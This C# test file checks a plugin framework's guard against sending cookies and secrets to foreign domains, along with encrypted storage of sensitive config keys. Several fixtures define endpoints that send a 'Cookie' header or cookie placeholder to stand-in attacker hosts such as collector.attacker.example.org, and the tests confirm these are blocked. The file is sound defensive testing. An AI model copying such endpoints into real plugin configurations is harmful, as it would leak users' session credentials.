using FluentAssertions;
using UsageMonitor.Core.Models;
using UsageMonitor.Core.Plugins;
using UsageMonitor.Core.Plugins.Declarative;
using UsageMonitor.Core.Security;
using UsageMonitor.Core.Services;
using UsageMonitor.Core.Tests._TestSupport;
using Xunit;

namespace UsageMonitor.Core.Tests;

/// <summary>
/// 安全加固批次测试：
/// ① 凭据占位符域名同源约束（CredentialDomainGuard + DeclarativeHttpFetcher 拦截 + PluginValidator 静态校验）；
/// ② 敏感配置键字段元数据显式声明（SensitiveConfigKeyRegistry + ConfigService enc:v1: 前缀加密）。
/// </summary>
public class CredentialSecurityTests
{
    // =====================================================================
    // ① CredentialDomainGuard 单元
    // =====================================================================

    /// <summary>构造带登录/捕获/用量页/显式域声明的清单，验证允许域集合推导。</summary>
    [Fact]
    public void CollectAllowedDomains_Derives_From_All_Manifest_Sections()
    {
        var manifest = PluginManifest.Load("""
        {
          "providerId": "Demo",
          "credentialDomains": [ "api.explicit.com" ],
          "usageUrls": { "zh-CN": "https://usage.pages.net/console" },
          "loginConfig": {
            "loginUrl": "https://platform.minimaxi.com",
            "cookieDomainFilters": [ ".minimaxi.com" ],
            "requiredCookieDomain": "account.minimaxi.com"
          },
          "fetch": {
            "capture": {
              "navigateUrl": "https://platform.minimaxi.com/console/usage",
              "cookieDomain": ".minimaxi.com",
              "variants": { "Global": { "navigateUrl": "https://global.minimax.io/usage", "cookieDomain": ".minimax.io" } }
            }
          }
        }
        """)!;

        var domains = CredentialDomainGuard.CollectAllowedDomains(manifest);

        domains.Should().Contain("api.explicit.com", "显式 credentialDomains 声明");
        domains.Should().Contain("platform.minimaxi.com", "loginUrl host");
        domains.Should().Contain("minimaxi.com", "cookieDomainFilters 去前导点");
        domains.Should().Contain("account.minimaxi.com", "requiredCookieDomain");
        domains.Should().Contain("usage.pages.net", "usageUrls host");
        domains.Should().Contain("minimax.io", "capture 变体 cookieDomain");
        domains.Should().Contain("global.minimax.io", "capture 变体 navigateUrl host");
    }

    /// <summary>host 命中判定：精确/子域命中，超串伪装与无关域不命中。</summary>
    [Theory]
    [InlineData("minimaxi.com", true)]
    [InlineData("api.minimaxi.com", true)]
    [InlineData("evilminimaxi.com", false)]  // 超串伪装：无点边界不得命中
    [InlineData("minimaxi.com.evil.net", false)]
    [InlineData("attacker.example.org", false)]
    public void IsHostAllowed_Enforces_Dot_Boundary(string host, bool expected)
    {
        var allowed = new HashSet<string> { "minimaxi.com" };
        CredentialDomainGuard.IsHostAllowed(host, allowed).Should().Be(expected);
    }

    /// <summary>Cookie 占位符检测：URL 模板与请求头均覆盖，无占位符不误报。</summary>
    [Fact]
    public void HasCookiePlaceholder_Detects_Url_And_Headers()
    {
        CredentialDomainGuard.HasCookiePlaceholder(new FetchEndpoint
        {
            UrlTemplate = "https://a.com/x?c={cookieHeader}"
        }).Should().BeTrue();

        CredentialDomainGuard.HasCookiePlaceholder(new FetchEndpoint
        {
            UrlTemplate = "https://a.com/x",
            Headers = new Dictionary<string, string> { ["Cookie"] = "{cookie:_token}" }
        }).Should().BeTrue();

        CredentialDomainGuard.HasCookiePlaceholder(new FetchEndpoint
        {
            UrlTemplate = "https://a.com/x",
            Headers = new Dictionary<string, string> { ["Accept"] = "application/json" }
        }).Should().BeFalse();
    }

    /// <summary>敏感配置占位符检测：注册表命中与关键词兜底命中，普通键不误报。</summary>
    [Fact]
    public void HasSensitiveConfigPlaceholder_Uses_Registry_And_Keyword_Fallback()
    {
        SensitiveConfigKeyRegistry.Register("UmTestGuardSession");

        CredentialDomainGuard.HasSensitiveConfigPlaceholder(new FetchEndpoint
        {
            Headers = new Dictionary<string, string> { ["X-Session"] = "{config:UmTestGuardSession}" }
        }).Should().BeTrue("注册表显式声明命中");

        CredentialDomainGuard.HasSensitiveConfigPlaceholder(new FetchEndpoint
        {
            Headers = new Dictionary<string, string> { ["Authorization"] = "Bearer {config:ApiKey}" }
        }).Should().BeTrue("关键词兜底命中");

        CredentialDomainGuard.HasSensitiveConfigPlaceholder(new FetchEndpoint
        {
            UrlTemplate = "https://a.com/{config:Region}/usage"
        }).Should().BeFalse("普通配置键不视为敏感");
    }

    /// <summary>字面 host 提取：正常提取、含占位符/端口/非 https 的处理。</summary>
    [Theory]
    [InlineData("https://api.example.com/v1/x", "api.example.com")]
    [InlineData("https://api.example.com:8443/v1", "api.example.com")]
    [InlineData("https://{config:Host}/v1", null)]  // authority 含占位符 → 交运行期
    [InlineData("http://api.example.com/v1", null)] // 非 https（另有校验报错）
    public void TryGetLiteralHost_Extracts_Or_Defers(string template, string? expected)
    {
        CredentialDomainGuard.TryGetLiteralHost(template).Should().Be(expected);
    }

    // =====================================================================
    // ① DeclarativeHttpFetcher 运行期拦截
    // =====================================================================

    /// <summary>携带 Cookie 占位符的端点目标域不在允许域集合 → 拒绝发送（不发起任何请求）。</summary>
    [Fact]
    public async Task HttpFetcher_CookieEndpoint_To_Foreign_Domain_Is_Blocked()
    {
        var endpoints = new[]
        {
            new FetchEndpoint
            {
                Mode = "http",
                UrlMatch = "leak",
                UrlTemplate = "https://collector.attacker.example.org/c",
                Headers = new Dictionary<string, string> { ["Cookie"] = "{cookieHeader}" }
            }
        };
        var responses = await DeclarativeHttpFetcher.FetchAsync(
            endpoints, _ => null, "_token=secret", new[] { "minimaxi.com" });
        responses.Should().BeEmpty("Cookie 外发到非官方域必须被域名同源约束拦截");
    }

    /// <summary>声明包无任何可推导官方域时，携带 Cookie 占位符的端点一律拒绝。</summary>
    [Fact]
    public async Task HttpFetcher_CookieEndpoint_Without_Allowed_Domains_Is_Blocked()
    {
        var endpoints = new[]
        {
            new FetchEndpoint
            {
                Mode = "http",
                UrlMatch = "leak",
                UrlTemplate = "https://collector.attacker.example.org/c?x={cookie:_token}"
            }
        };
        var responses = await DeclarativeHttpFetcher.FetchAsync(
            endpoints, _ => null, "_token=secret", null);
        responses.Should().BeEmpty("无官方域声明时 Cookie 占位符端点必须拒绝");
    }

    // =====================================================================
    // ① PluginValidator 静态校验
    // =====================================================================

    /// <summary>Cookie 占位符端点 + 无任何官方域声明 → 校验 Error。</summary>
    [Fact]
    public void Validator_CookieEndpoint_Without_Domains_Is_Error()
    {
        var result = PluginValidator.Validate("""
        {
          "providerId": "Demo",
          "fetch": {
            "endpoints": [
              { "mode": "http", "urlMatch": "m", "urlTemplate": "https://evil.example.org/api",
                "headers": { "Cookie": "{cookieHeader}" } }
            ]
          }
        }
        """);
        result.Errors.Should().Contain(e => e.Contains("Cookie 占位符"), "无官方域声明必须报错");
    }

    /// <summary>Cookie 占位符端点字面 host 不在官方域集合 → 校验 Error；同源 host 不报错。</summary>
    [Fact]
    public void Validator_CookieEndpoint_LiteralHost_Must_Match_Domains()
    {
        const string manifestTemplate = """
        {
          "providerId": "Demo",
          "loginConfig": { "loginUrl": "https://platform.example.com", "cookieDomainFilters": [ "example.com" ] },
          "fetch": {
            "endpoints": [
              { "mode": "http", "urlMatch": "m", "urlTemplate": "URL_HERE",
                "headers": { "Cookie": "{cookieHeader}" } }
            ]
          }
        }
        """;

        var bad = PluginValidator.Validate(manifestTemplate.Replace("URL_HERE", "https://evil.attacker.net/api"));
        bad.Errors.Should().Contain(e => e.Contains("evil.attacker.net"), "字面 host 不同源必须报错");

        var good = PluginValidator.Validate(manifestTemplate.Replace("URL_HERE", "https://api.example.com/api"));
        good.Errors.Should().BeEmpty("同源 host 不应产生凭据校验错误");
    }

    // =====================================================================
    // ② SensitiveConfigKeyRegistry + ConfigField.Sensitive
    // =====================================================================

    /// <summary>Sensitive=true 与 Password 类型字段注册后命中；普通键不命中；关键词兜底保留。</summary>
    [Fact]
    public void Registry_Registers_Sensitive_And_Password_Fields()
    {
        SensitiveConfigKeyRegistry.RegisterFields(new[]
        {
            new ConfigField("UmTestBlobA", "凭据A", ConfigFieldType.Text) { Sensitive = true },
            new ConfigField("UmTestPwdB", "凭据B", ConfigFieldType.Password),
            new ConfigField("UmTestRegionC", "区域", ConfigFieldType.Select)
        });

        SensitiveConfigKeyRegistry.IsSensitive("UmTestBlobA").Should().BeTrue("Sensitive=true 显式声明");
        SensitiveConfigKeyRegistry.IsSensitive("umtestpwdb").Should().BeTrue("Password 类型隐含敏感（大小写不敏感）");
        SensitiveConfigKeyRegistry.IsSensitive("UmTestRegionC").Should().BeFalse("普通 Select 字段非敏感");
        SensitiveConfigKeyRegistry.IsSensitive("MyApiKey").Should().BeTrue("关键词兜底与历史行为一致");
    }

    /// <summary>声明包 configFields 节的 sensitive/credentialDomains 属性可正确反序列化。</summary>
    [Fact]
    public void Manifest_Parses_Sensitive_Field_And_CredentialDomains()
    {
        var manifest = PluginManifest.Load("""
        {
          "providerId": "Demo",
          "credentialDomains": [ "api.demo.com" ],
          "configFields": [
            { "key": "SessionState", "displayName": "会话", "fieldType": "Text", "sensitive": true }
          ]
        }
        """)!;

        manifest.CredentialDomains.Should().ContainSingle().Which.Should().Be("api.demo.com");
        manifest.ConfigFields.Should().ContainSingle().Which.Sensitive.Should().BeTrue();
    }

    // =====================================================================
    // ② ConfigService：注册键落盘加密（enc:v1: 前缀）round-trip
    // =====================================================================

    /// <summary>
    /// 元数据注册的非常规命名敏感键：Save 后磁盘为 enc:v1: 前缀密文（无明文），
    /// 重新加载后解密还原明文（前缀自描述，不依赖注册时机）。
    /// </summary>
    [Fact]
    public void ConfigService_Encrypts_Registered_Custom_Key_With_Prefix()
    {
        SensitiveConfigKeyRegistry.Register("UmTestSessionBlob");
        using var tempDir = new TempDir();
        var configPath = tempDir.Combine("config.json");

        var svc = new ConfigService();
        ReflectionHelpers.SetField(svc, "_configDirectory", tempDir.Path);
        ReflectionHelpers.SetField(svc, "_configFilePath", configPath);

        var config = svc.GetProviderConfig("DemoProvider");
        config.SetValue("UmTestSessionBlob", "top-secret-session-value");
        svc.UpdateProviderConfig("DemoProvider", config);

        // 磁盘断言：密文带前缀且无明文
        var rawJson = File.ReadAllText(configPath);
        rawJson.Should().Contain("enc:v1:", "注册键落盘必须为前缀密文");
        rawJson.Should().NotContain("top-secret-session-value", "明文绝不落盘");

        // 内存断言：Save 后还原为明文（业务代码始终读明文）
        svc.GetProviderConfig("DemoProvider").GetValue("UmTestSessionBlob")
            .Should().Be("top-secret-session-value");

        // 重新加载断言：前缀自描述 → 无需依赖注册时机即可解密
        var svc2 = new ConfigService();
        ReflectionHelpers.SetField(svc2, "_configDirectory", tempDir.Path);
        ReflectionHelpers.SetField(svc2, "_configFilePath", configPath);
        svc2.ReloadProviderConfigsFromDisk();
        svc2.GetProviderConfig("DemoProvider").GetValue("UmTestSessionBlob")
            .Should().Be("top-secret-session-value");
    }
}
